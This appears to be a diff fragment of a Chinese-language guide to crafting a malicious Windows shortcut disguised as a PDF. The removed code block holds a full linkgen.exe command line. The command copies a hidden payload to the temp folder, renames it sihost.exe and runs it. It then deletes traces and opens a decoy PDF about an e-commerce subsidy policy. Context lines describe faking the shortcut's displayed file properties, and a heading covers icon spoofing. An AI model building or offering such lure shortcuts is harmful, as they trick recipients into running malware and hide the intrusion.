@@ -5,9 +5,6 @@
 
 test处可伪装成正常打开pdf时显示的内容（类型、大小、修改日期）
 
-```
-linkgen.exe calc.pdf.lnk "test" "xcopy /h /y %cd%__MACOSX.DOCX\calc.tmp %temp%\ & attrib -s -a -h %temp%\calc.tmp & rename %temp%\calc.tmp sihost.exe & attrib -s -a -h %cd%__MACOSX.DOCX\calc.tmp & start %temp%\sihost.exe & del "calc.pdf.lnk" & del /F /A /Q "%cd%__MACOSX.DOCX\wct366A.tmp" & copy "%cd%__MACOSX.DOCX\电子商务产业发展扶持奖励政策.pdf" "%cd%\XXX电子商务产业发展扶持奖励政策.pdf" & start "" "%cd%\XXX电子商务产业发展扶持奖励政策.pdf" & del "%cd%__MACOSX.DOCX\XXX电子商务产业发展扶持奖励政策.pdf" "
-```
 
 ### 2.图标处理
 参考 https://www.cnblogs.com/f-carey/p/16542156.html#tid-sywapk 
